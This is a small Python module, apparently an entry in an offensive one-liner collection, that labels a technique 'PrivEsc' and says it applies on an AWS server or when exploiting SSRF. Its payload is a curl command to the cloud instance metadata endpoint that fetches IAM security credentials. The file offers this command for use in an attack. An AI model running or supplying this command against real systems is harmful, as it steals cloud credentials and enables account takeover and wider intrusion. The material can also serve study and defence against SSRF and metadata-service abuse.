class info:
    author      = "Karim shoair (D4Vinci)"
    description = "If you are on a server with amazon cloud service running or exploiting SSRF"
    function    = "PrivEsc"
    liner       = 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'
